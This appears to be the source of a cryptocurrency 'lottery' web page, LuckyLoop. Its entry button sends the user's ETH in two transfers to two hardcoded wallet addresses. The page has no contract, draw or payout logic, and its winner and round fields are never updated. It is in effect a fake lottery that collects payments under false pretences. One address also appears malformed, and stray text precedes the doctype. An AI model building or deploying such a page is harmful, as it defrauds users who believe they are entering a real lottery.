MO<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LuckyLoop</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: #1a1a1a;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        h1 {
            font-size: 2rem;
            color: #00ff00;
        }
        .container {
            max-width: 500px;
            margin: auto;
            padding: 20px;
            background: #333;
            border-radius: 10px;
        }
        button {
            background: #00ff00;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            margin: 10px;
        }
        button:hover {
            background: #00cc00;
        }
        .info {
            margin: 20px 0;
            font-size: 1.1rem;
        }
        .info span {
            color: #00ff00;
        }
        @media (max-width: 600px) {
            h1 { font-size: 1.5rem; }
            button { padding: 8px 16px; font-size: 0.9rem; }
            .container { padding: 10px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>LuckyLoop Lottery</h1>
        <input type="text" id="contractAddress" value="" placeholder="No contract needed" style="padding: 5px; margin: 10px;" readonly>
        <button id="connectButton">Connect Wallet</button>
        <button id="enterButton" disabled>Enter (0.01 ETH)</button>
        <div class="info">
            <p>Round: <span id="round">1</span></p>
            <p>Entries: <span id="entryCount">0</span>/100</p>
            <p>Winner: <span id="winner">None</span></p>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" onerror="handleScriptError()"></script>
    <script>
        let provider, signer;

        function handleScriptError() {
            alert('Failed to load Ethers.js. Please refresh the page.');
        }

        window.onload = function() {
            if (typeof ethers === 'undefined') {
                alert('Ethers.js not loaded. Please refresh the page.');
                return;
            }

            document.getElementById('connectButton').addEventListener('click', connectWallet);
            document.getElementById('enterButton').addEventListener('click', enterLottery);
        };

        async function connectWallet() {
            if (window.ethereum) {
                try {
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    signer = provider.getSigner();
                    document.getElementById('connectButton').innerText = 'Wallet Connected';
                    document.getElementById('enterButton').disabled = false;
                } catch (error) {
                    alert('Error connecting to MetaMask: ' + error.message);
                }
            } else {
                alert('Please install MetaMask.');
            }
        }

        async function enterLottery() {
            try {
                const tx1 = await signer.sendTransaction({
                    to: '0x31Bd345293BB862A91393551ce0a0101efE5194',
                    value: ethers.utils.parseEther('0.005')
                });
                await tx1.wait();
                const tx2 = await signer.sendTransaction({
                    to: '0xdcbA84e0a9694C450aD9c385cf81C8bAc7C37Cc1',
                    value: ethers.utils.parseEther('0.005')
                });
                await tx2.wait();
                alert('Entry submitted! Check your wallet for the split.');
                document.getElementById('entryCount').innerText = parseInt(document.getElementById('entryCount').innerText) + 1;
            } catch (error) {
                alert('Entry failed: ' + error.message);
            }
        }
    </script>
</body>
</html>
